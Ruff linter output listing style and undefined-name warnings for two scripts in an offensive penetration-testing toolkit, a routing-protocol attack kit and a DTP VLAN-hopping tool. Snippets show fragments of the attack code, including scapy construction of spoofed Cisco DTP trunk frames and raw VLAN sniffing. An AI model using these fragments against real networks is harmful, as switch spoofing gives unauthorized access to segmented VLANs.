help: Rename unused `k` to `_k`

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:649:24
    |
647 |         out = shell(v)
648 |         if len(out) > 0:
649 |             Logger.dbg("Default interface lookup command returned:\n{}".format(out))
    |                        ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
650 |             config["interface"] = out
651 |             return out
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:660:9
    |
659 |       print(
660 | /         """
661 | |         :: Routing Protocols Exploitation toolkit
662 | |         Sends out various routing protocols management frames 
663 | |         Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
664 | |         v{}
665 | | """.format(
666 | |             VERSION
667 | |         )
    | |_________^
668 |       )
    |
help: Convert to f-string

W291 Trailing whitespace
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:662:62
    |
660 |         """
661 |         :: Routing Protocols Exploitation toolkit
662 |         Sends out various routing protocols management frames 
    |                                                              ^
663 |         Mariusz Banach / mgeeky '19, <mb@binary-offensive.com>
664 |         v{}
    |
help: Remove trailing whitespace

E713 [*] Test for membership should be `not in`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:750:12
    |
748 |     args = parser.parse_args()
749 |
750 |     if not "attack" in args:
    |            ^^^^^^^^^^^^^^^^
751 |         Logger.err("You must specify an attack to launch!")
752 |         return False
    |
help: Convert to `not in`

E722 Do not use bare `except`
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:764:9
    |
762 |         try:
763 |             att = int(att)
764 |         except:
    |         ^^^^^^
765 |             pass
    |

F405 `os` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:900:8
    |
898 |         return False
899 |
900 |     if os.getuid() != 0:
    |        ^^
901 |         Logger.err("This program must be run as root.")
902 |         return False
    |

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:904:5
    |
902 |         return False
903 |
904 |     load_contrib("ospf")
    |     ^^^^^^^^^^^^
905 |     load_contrib("eigrp")
906 |     load_contrib("bgp")
    |

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:905:5
    |
904 |     load_contrib("ospf")
905 |     load_contrib("eigrp")
    |     ^^^^^^^^^^^^
906 |     load_contrib("bgp")
    |

F405 `load_contrib` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\RoutingAttackKit.py:906:5
    |
904 |     load_contrib("ospf")
905 |     load_contrib("eigrp")
906 |     load_contrib("bgp")
    |     ^^^^^^^^^^^^
907 |
908 |     attack = config["attack"]["object"]()
    |

F401 [*] `subprocess` imported but unused
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:51:8
   |
49 | import socket
50 | import struct
51 | import subprocess
   |        ^^^^^^^^^^
52 | import sys
53 | import tempfile
   |
help: Remove unused import: `subprocess`

F403 `from ctypes import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:56:1
   |
54 | import textwrap
55 | import threading
56 | from ctypes import *
   | ^^^^^^^^^^^^^^^^^^^^
57 |
58 | import commands
   |

F403 `from scapy.all import *` used; unable to detect undefined names
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:61:5
   |
60 | try:
61 |     from scapy.all import *
   |     ^^^^^^^^^^^^^^^^^^^^^^^
62 | except ImportError:
63 |     print("[!] Scapy required: pip install scapy")
   |

N816 Variable `arpScanAvailable` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:84:1
   |
82 | }
83 |
84 | arpScanAvailable = False
   | ^^^^^^^^^^^^^^^^
85 | vconfigAvailable = False
86 | stopThreads = False
   |

N816 Variable `vconfigAvailable` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:85:1
   |
84 | arpScanAvailable = False
85 | vconfigAvailable = False
   | ^^^^^^^^^^^^^^^^
86 | stopThreads = False
87 | attackEngaged = False
   |

N816 Variable `stopThreads` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:86:1
   |
84 | arpScanAvailable = False
85 | vconfigAvailable = False
86 | stopThreads = False
   | ^^^^^^^^^^^
87 | attackEngaged = False
88 | dot1qSnifferStarted = False
   |

N816 Variable `attackEngaged` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:87:1
   |
85 | vconfigAvailable = False
86 | stopThreads = False
87 | attackEngaged = False
   | ^^^^^^^^^^^^^
88 | dot1qSnifferStarted = False
   |

N816 Variable `dot1qSnifferStarted` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:88:1
   |
86 | stopThreads = False
87 | attackEngaged = False
88 | dot1qSnifferStarted = False
   | ^^^^^^^^^^^^^^^^^^^
89 |
90 | vlansDiscovered = set()
   |

N816 Variable `vlansDiscovered` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:90:1
   |
88 | dot1qSnifferStarted = False
89 |
90 | vlansDiscovered = set()
   | ^^^^^^^^^^^^^^^
91 | vlansHopped = set()
92 | vlansLeases = {}
   |

N816 Variable `vlansHopped` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:91:1
   |
90 | vlansDiscovered = set()
91 | vlansHopped = set()
   | ^^^^^^^^^^^
92 | vlansLeases = {}
93 | subinterfaces = set()
   |

N816 Variable `vlansLeases` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:92:1
   |
90 | vlansDiscovered = set()
91 | vlansHopped = set()
92 | vlansLeases = {}
   | ^^^^^^^^^^^
93 | subinterfaces = set()
94 | cdpsCollected = set()
   |

N816 Variable `cdpsCollected` in global scope should not be mixedCase
  --> security\penetration-testing-tools\networks\VLANHopperDTP.py:94:1
   |
92 | vlansLeases = {}
93 | subinterfaces = set()
94 | cdpsCollected = set()
   | ^^^^^^^^^^^^^
95 |
96 | tempfiles = []
   |

N801 Class name `struct_iovec` should use CapWords convention
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:110:7
    |
110 | class struct_iovec(Structure):
    |       ^^^^^^^^^^^^
111 |     _fields_ = [
112 |         ("iov_base", c_void_p),
    |

F405 `Structure` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:110:20
    |
110 | class struct_iovec(Structure):
    |                    ^^^^^^^^^
111 |     _fields_ = [
112 |         ("iov_base", c_void_p),
    |

F405 `c_void_p` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:112:22
    |
110 | class struct_iovec(Structure):
111 |     _fields_ = [
112 |         ("iov_base", c_void_p),
    |                      ^^^^^^^^
113 |         ("iov_len", c_size_t),
114 |     ]
    |

F405 `c_size_t` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:113:21
    |
111 |     _fields_ = [
112 |         ("iov_base", c_void_p),
113 |         ("iov_len", c_size_t),
    |                     ^^^^^^^^
114 |     ]
    |

N801 Class name `struct_msghdr` should use CapWords convention
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:117:7
    |
117 | class struct_msghdr(Structure):
    |       ^^^^^^^^^^^^^
118 |     _fields_ = [
119 |         ("msg_name", c_void_p),
    |

F405 `Structure` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:117:21
    |
117 | class struct_msghdr(Structure):
    |                     ^^^^^^^^^
118 |     _fields_ = [
119 |         ("msg_name", c_void_p),
    |

F405 `c_void_p` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:119:22
    |
117 | class struct_msghdr(Structure):
118 |     _fields_ = [
119 |         ("msg_name", c_void_p),
    |                      ^^^^^^^^
120 |         ("msg_namelen", c_uint32),
121 |         ("msg_iov", POINTER(struct_iovec)),
    |

F405 `c_uint32` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:120:25
    |
118 |     _fields_ = [
119 |         ("msg_name", c_void_p),
120 |         ("msg_namelen", c_uint32),
    |                         ^^^^^^^^
121 |         ("msg_iov", POINTER(struct_iovec)),
122 |         ("msg_iovlen", c_size_t),
    |

F405 `POINTER` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:121:21
    |
119 |         ("msg_name", c_void_p),
120 |         ("msg_namelen", c_uint32),
121 |         ("msg_iov", POINTER(struct_iovec)),
    |                     ^^^^^^^
122 |         ("msg_iovlen", c_size_t),
123 |         ("msg_control", c_void_p),
    |

F405 `c_size_t` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:122:24
    |
120 |         ("msg_namelen", c_uint32),
121 |         ("msg_iov", POINTER(struct_iovec)),
122 |         ("msg_iovlen", c_size_t),
    |                        ^^^^^^^^
123 |         ("msg_control", c_void_p),
124 |         ("msg_controllen", c_size_t),
    |

F405 `c_void_p` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:123:25
    |
121 |         ("msg_iov", POINTER(struct_iovec)),
122 |         ("msg_iovlen", c_size_t),
123 |         ("msg_control", c_void_p),
    |                         ^^^^^^^^
124 |         ("msg_controllen", c_size_t),
125 |         ("msg_flags", c_int),
    |

F405 `c_size_t` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:124:28
    |
122 |         ("msg_iovlen", c_size_t),
123 |         ("msg_control", c_void_p),
124 |         ("msg_controllen", c_size_t),
    |                            ^^^^^^^^
125 |         ("msg_flags", c_int),
126 |     ]
    |

F405 `c_int` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:125:23
    |
123 |         ("msg_control", c_void_p),
124 |         ("msg_controllen", c_size_t),
125 |         ("msg_flags", c_int),
    |                       ^^^^^
126 |     ]
    |

N801 Class name `struct_cmsghdr` should use CapWords convention
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:129:7
    |
129 | class struct_cmsghdr(Structure):
    |       ^^^^^^^^^^^^^^
130 |     _fields_ = [
131 |         ("cmsg_len", c_size_t),
    |

F405 `Structure` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:129:22
    |
129 | class struct_cmsghdr(Structure):
    |                      ^^^^^^^^^
130 |     _fields_ = [
131 |         ("cmsg_len", c_size_t),
    |

F405 `c_size_t` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:131:22
    |
129 | class struct_cmsghdr(Structure):
130 |     _fields_ = [
131 |         ("cmsg_len", c_size_t),
    |                      ^^^^^^^^
132 |         ("cmsg_level", c_int),
133 |         ("cmsg_type", c_int),
    |

F405 `c_int` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:132:24
    |
130 |     _fields_ = [
131 |         ("cmsg_len", c_size_t),
132 |         ("cmsg_level", c_int),
    |                        ^^^^^
133 |         ("cmsg_type", c_int),
134 |     ]
    |

F405 `c_int` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:133:23
    |
131 |         ("cmsg_len", c_size_t),
132 |         ("cmsg_level", c_int),
133 |         ("cmsg_type", c_int),
    |                       ^^^^^
134 |     ]
    |

N801 Class name `struct_tpacket_auxdata` should use CapWords convention
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:137:7
    |
137 | class struct_tpacket_auxdata(Structure):
    |       ^^^^^^^^^^^^^^^^^^^^^^
138 |     _fields_ = [
139 |         ("tp_status", c_uint),
    |

F405 `Structure` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:137:30
    |
137 | class struct_tpacket_auxdata(Structure):
    |                              ^^^^^^^^^
138 |     _fields_ = [
139 |         ("tp_status", c_uint),
    |

F405 `c_uint` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:139:23
    |
137 | class struct_tpacket_auxdata(Structure):
138 |     _fields_ = [
139 |         ("tp_status", c_uint),
    |                       ^^^^^^
140 |         ("tp_len", c_uint),
141 |         ("tp_snaplen", c_uint),
    |

F405 `c_uint` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:140:20
    |
138 |     _fields_ = [
139 |         ("tp_status", c_uint),
140 |         ("tp_len", c_uint),
    |                    ^^^^^^
141 |         ("tp_snaplen", c_uint),
142 |         ("tp_mac", c_ushort),
    |

F405 `c_uint` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:141:24
    |
139 |         ("tp_status", c_uint),
140 |         ("tp_len", c_uint),
141 |         ("tp_snaplen", c_uint),
    |                        ^^^^^^
142 |         ("tp_mac", c_ushort),
143 |         ("tp_net", c_ushort),
    |

F405 `c_ushort` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:142:20
    |
140 |         ("tp_len", c_uint),
141 |         ("tp_snaplen", c_uint),
142 |         ("tp_mac", c_ushort),
    |                    ^^^^^^^^
143 |         ("tp_net", c_ushort),
144 |         ("tp_vlan_tci", c_ushort),
    |

F405 `c_ushort` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:143:20
    |
141 |         ("tp_snaplen", c_uint),
142 |         ("tp_mac", c_ushort),
143 |         ("tp_net", c_ushort),
    |                    ^^^^^^^^
144 |         ("tp_vlan_tci", c_ushort),
145 |         ("tp_padding", c_ushort),
    |

F405 `c_ushort` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:144:25
    |
142 |         ("tp_mac", c_ushort),
143 |         ("tp_net", c_ushort),
144 |         ("tp_vlan_tci", c_ushort),
    |                         ^^^^^^^^
145 |         ("tp_padding", c_ushort),
146 |     ]
    |

F405 `c_ushort` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:145:24
    |
143 |         ("tp_net", c_ushort),
144 |         ("tp_vlan_tci", c_ushort),
145 |         ("tp_padding", c_ushort),
    |                        ^^^^^^^^
146 |     ]
    |

F405 `CDLL` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:149:8
    |
149 | libc = CDLL("libc.so.6")
    |        ^^^^
150 | recvmsg = libc.recvmsg
151 | recvmsg.argtypes = [c_int, POINTER(struct_msghdr), c_int]
    |

F405 `c_int` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:151:21
    |
149 | libc = CDLL("libc.so.6")
150 | recvmsg = libc.recvmsg
151 | recvmsg.argtypes = [c_int, POINTER(struct_msghdr), c_int]
    |                     ^^^^^
152 | recvmsg.retype = c_int
    |

F405 `POINTER` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:151:28
    |
149 | libc = CDLL("libc.so.6")
150 | recvmsg = libc.recvmsg
151 | recvmsg.argtypes = [c_int, POINTER(struct_msghdr), c_int]
    |                            ^^^^^^^
152 | recvmsg.retype = c_int
    |

F405 `c_int` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:151:52
    |
149 | libc = CDLL("libc.so.6")
150 | recvmsg = libc.recvmsg
151 | recvmsg.argtypes = [c_int, POINTER(struct_msghdr), c_int]
    |                                                    ^^^^^
152 | recvmsg.retype = c_int
    |

F405 `c_int` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:152:18
    |
150 | recvmsg = libc.recvmsg
151 | recvmsg.argtypes = [c_int, POINTER(struct_msghdr), c_int]
152 | recvmsg.retype = c_int
    |                  ^^^^^
    |

F405 `create_string_buffer` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:170:11
    |
168 |     @bufsize Maximum packet size
169 |     """
170 |     buf = create_string_buffer(bufsize)
    |           ^^^^^^^^^^^^^^^^^^^^
171 |
172 |     ctrl_bufsize = (
    |

F405 `sizeof` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:173:9
    |
172 |     ctrl_bufsize = (
173 |         sizeof(struct_cmsghdr) + sizeof(struct_tpacket_auxdata) + sizeof(c_size_t)
    |         ^^^^^^
174 |     )
175 |     ctrl_buf = create_string_buffer(ctrl_bufsize)
    |

F405 `sizeof` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:173:34
    |
172 |     ctrl_bufsize = (
173 |         sizeof(struct_cmsghdr) + sizeof(struct_tpacket_auxdata) + sizeof(c_size_t)
    |                                  ^^^^^^
174 |     )
175 |     ctrl_buf = create_string_buffer(ctrl_bufsize)
    |

F405 `sizeof` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:173:67
    |
172 |     ctrl_bufsize = (
173 |         sizeof(struct_cmsghdr) + sizeof(struct_tpacket_auxdata) + sizeof(c_size_t)
    |                                                                   ^^^^^^
174 |     )
175 |     ctrl_buf = create_string_buffer(ctrl_bufsize)
    |

F405 `c_size_t` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:173:74
    |
172 |     ctrl_bufsize = (
173 |         sizeof(struct_cmsghdr) + sizeof(struct_tpacket_auxdata) + sizeof(c_size_t)
    |                                                                          ^^^^^^^^
174 |     )
175 |     ctrl_buf = create_string_buffer(ctrl_bufsize)
    |

F405 `create_string_buffer` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:175:16
    |
173 |         sizeof(struct_cmsghdr) + sizeof(struct_tpacket_auxdata) + sizeof(c_size_t)
174 |     )
175 |     ctrl_buf = create_string_buffer(ctrl_bufsize)
    |                ^^^^^^^^^^^^^^^^^^^^
176 |
177 |     iov = struct_iovec()
    |

F405 `cast` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:178:20
    |
177 |     iov = struct_iovec()
178 |     iov.iov_base = cast(buf, c_void_p)
    |                    ^^^^
179 |     iov.iov_len = bufsize
    |

F405 `c_void_p` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:178:30
    |
177 |     iov = struct_iovec()
178 |     iov.iov_base = cast(buf, c_void_p)
    |                              ^^^^^^^^
179 |     iov.iov_len = bufsize
    |

F405 `pointer` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:184:22
    |
182 |     msghdr.msg_name = None
183 |     msghdr.msg_namelen = 0
184 |     msghdr.msg_iov = pointer(iov)
    |                      ^^^^^^^
185 |     msghdr.msg_iovlen = 1
186 |     msghdr.msg_control = cast(ctrl_buf, c_void_p)
    |

F405 `cast` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:186:26
    |
184 |     msghdr.msg_iov = pointer(iov)
185 |     msghdr.msg_iovlen = 1
186 |     msghdr.msg_control = cast(ctrl_buf, c_void_p)
    |                          ^^^^
187 |     msghdr.msg_controllen = ctrl_bufsize
188 |     msghdr.msg_flags = 0
    |

F405 `c_void_p` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:186:41
    |
184 |     msghdr.msg_iov = pointer(iov)
185 |     msghdr.msg_iovlen = 1
186 |     msghdr.msg_control = cast(ctrl_buf, c_void_p)
    |                                         ^^^^^^^^
187 |     msghdr.msg_controllen = ctrl_bufsize
188 |     msghdr.msg_flags = 0
    |

F405 `byref` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:190:31
    |
188 |     msghdr.msg_flags = 0
189 |
190 |     rv = recvmsg(sk.fileno(), byref(msghdr), 0)
    |                               ^^^^^
191 |     if rv < 0:
192 |         raise RuntimeError("recvmsg failed: rv=%d", rv)
    |

F405 `sizeof` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:197:37
    |
195 |     # only enabled PACKET_AUXDATA, so we can assume it's the
196 |     # only control message.
197 |     assert msghdr.msg_controllen >= sizeof(struct_cmsghdr)
    |                                     ^^^^^^
198 |
199 |     cmsghdr = struct_cmsghdr.from_buffer(ctrl_buf)  # pylint: disable=E1101
    |

F405 `sizeof` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:204:19
    |
203 |     auxdata = struct_tpacket_auxdata.from_buffer(
204 |         ctrl_buf, sizeof(struct_cmsghdr)
    |                   ^^^^^^
205 |     )  # pylint: disable=E1101
    |

F405 `Dot3` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:313:16
    |
311 |     while not stopThreads:
312 |         # Ethernet
313 |         dot3 = Dot3(src=config["macaddr"], dst="01:00:0c:cc:cc:cc", len=42)
    |                ^^^^
314 |
315 |         # Logical-Link Control
    |

F405 `LLC` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:316:15
    |
315 |         # Logical-Link Control
316 |         llc = LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
    |               ^^^
317 |
318 |         # OUT = Cisco, Code = DTP
    |

F405 `SNAP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:319:16
    |
318 |         # OUT = Cisco, Code = DTP
319 |         snap = SNAP(OUI=0x0C, code=0x2004)
    |                ^^^^
320 |
321 |         # DTP, Status = Access/Desirable (3), Type: Trunk (3)
    |

F405 `DTP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:322:15
    |
321 |         # DTP, Status = Access/Desirable (3), Type: Trunk (3)
322 |         dtp = DTP(
    |               ^^^
323 |             ver=1,
324 |             tlvlist=[
    |

F405 `DTPDomain` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:325:17
    |
323 |             ver=1,
324 |             tlvlist=[
325 |                 DTPDomain(
    |                 ^^^^^^^^^
326 |                     length=13,
327 |                     type=1,
    |

F405 `DTPStatus` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:330:17
    |
328 |                     domain="\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00",
329 |                 ),
330 |                 DTPStatus(status="\\x03", length=5, type=2),
    |                 ^^^^^^^^^
331 |                 DTPType(length=5, type=3, dtptype="\\xa5"),
332 |                 DTPNeighbor(type=4, neighbor=config["macaddr"], len=10),
    |

F405 `DTPType` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:331:17
    |
329 |                 ),
330 |                 DTPStatus(status="\\x03", length=5, type=2),
331 |                 DTPType(length=5, type=3, dtptype="\\xa5"),
    |                 ^^^^^^^
332 |                 DTPNeighbor(type=4, neighbor=config["macaddr"], len=10),
333 |             ],
    |

F405 `DTPNeighbor` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:332:17
    |
330 |                 DTPStatus(status="\\x03", length=5, type=2),
331 |                 DTPType(length=5, type=3, dtptype="\\xa5"),
332 |                 DTPNeighbor(type=4, neighbor=config["macaddr"], len=10),
    |                 ^^^^^^^^^^^
333 |             ],
334 |         )
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:338:20
    |
336 |         frame = dot3 / llc / snap / dtp
337 |
338 |         Logger.dbg("SENT: DTP Trunk Keep-Alive:\n{}".format(frame.summary()))
    |                    ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
339 |         send(frame, iface=config["interface"], verbose=False)
    |
help: Convert to f-string

F405 `send` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:339:9
    |
338 |         Logger.dbg("SENT: DTP Trunk Keep-Alive:\n{}".format(frame.summary()))
339 |         send(frame, iface=config["interface"], verbose=False)
    |         ^^^^
340 |
341 |         time.sleep(config["timeout"] / 3)
    |

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:341:9
    |
339 |         send(frame, iface=config["interface"], verbose=False)
340 |
341 |         time.sleep(config["timeout"] / 3)
    |         ^^^^
    |

F405 `ETH_P_ALL` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:355:37
    |
354 |     sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
355 |     sock.bind((config["interface"], ETH_P_ALL))
    |                                     ^^^^^^^^^
356 |     enable_auxdata(sock)
    |

F405 `Ether` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:362:15
    |
360 |     while not stopThreads:
361 |         buf = recv(sock, 65535)
362 |         pkt = Ether(buf)
    |               ^^^^^
363 |
364 |         if pkt.haslayer(Dot1Q):
    |

F405 `Dot1Q` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:364:25
    |
362 |         pkt = Ether(buf)
363 |
364 |         if pkt.haslayer(Dot1Q):
    |                         ^^^^^
365 |             dot1q = pkt.vlan
366 |             if dot1q not in vlansDiscovered:
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:367:23
    |
365 |             dot1q = pkt.vlan
366 |             if dot1q not in vlansDiscovered:
367 |                 print("==> VLAN discovered: {}".format(dot1q))
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
368 |                 vlansDiscovered.add(dot1q)
    |
help: Convert to f-string

E712 Avoid equality comparisons to `False`; use `not attackEngaged:` for false checks
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:386:8
    |
384 |         return
385 |
386 |     if attackEngaged == False:
    |        ^^^^^^^^^^^^^^^^^^^^^^
387 |         success = False
388 |         for dtp in dtps:
    |
help: Replace with `not attackEngaged`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:389:13
    |
387 |           success = False
388 |           for dtp in dtps:
389 | /             if dtp.haslayer(DTP):
390 | |                 if inspectPacket(dtp):
    | |______________________________________^
391 |                       success = True
392 |                       break
    |
help: Combine `if` statements using `and`

F405 `DTP` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:389:29
    |
387 |         success = False
388 |         for dtp in dtps:
389 |             if dtp.haslayer(DTP):
    |                             ^^^
390 |                 if inspectPacket(dtp):
391 |                     success = True
    |

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:403:13
    |
402 |             attackEngaged = True
403 |             time.sleep(5)
    |             ^^^^
404 |
405 |     if config["force"]:
    |

F405 `time` may be undefined, or defined from star imports
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:414:9
    |
413 |         attackEngaged = True
414 |         time.sleep(5)
    |         ^^^^
415 |
416 |     if attackEngaged:
    |

N803 Argument name `forceOut` should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:420:31
    |
420 | def launchCommand(subif, cmd, forceOut=False, noCmd=False):
    |                               ^^^^^^^^^^^^^^
421 |     Logger.dbg('Subinterface: {}, Parsing command: "{}"'.format(subif, cmd))
    |

N803 Argument name `noCmd` should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:420:47
    |
420 | def launchCommand(subif, cmd, forceOut=False, noCmd=False):
    |                                               ^^^^^^^^^^^
421 |     Logger.dbg('Subinterface: {}, Parsing command: "{}"'.format(subif, cmd))
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:421:16
    |
420 | def launchCommand(subif, cmd, forceOut=False, noCmd=False):
421 |     Logger.dbg('Subinterface: {}, Parsing command: "{}"'.format(subif, cmd))
    |                ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
422 |
423 |     if "%IFACE" in cmd:
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:468:15
    |
467 |     if not noCmd:
468 |         print('[>] Launching command: "{}"'.format(cmd))
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
469 |     out = shell(cmd)
    |
help: Convert to f-string

N803 Argument name `forceOut` should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:479:37
    |
479 | def launchCommands(subif, commands, forceOut=False, noCmd=False):
    |                                     ^^^^^^^^^^^^^^
480 |     for cmd in commands:
481 |         launchCommand(subif, cmd, forceOut, noCmd)
    |

N803 Argument name `noCmd` should be lowercase
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:479:53
    |
479 | def launchCommands(subif, commands, forceOut=False, noCmd=False):
    |                                                     ^^^^^^^^^^^
480 |     for cmd in commands:
481 |         launchCommand(subif, cmd, forceOut, noCmd)
    |

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:493:13
    |
491 |       if not vconfigAvailable:
492 |           Logger.fail(
493 | /             "No 8021q or vconfig available. Unable to create {} subinterface and obtain DHCP lease.".format(
494 | |                 subif
495 | |             )
    | |_____________^
496 |           )
497 |           return
    |
help: Convert to f-string

UP032 [*] Use f-string instead of `format` call
   --> security\penetration-testing-tools\networks\VLANHopperDTP.py:500:21
    |
499 |     if subif in subinterfaces:
500 |         Logger.fail("Already created that subinterface: {}".format(subif))
    |                     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
501 |         return
    |
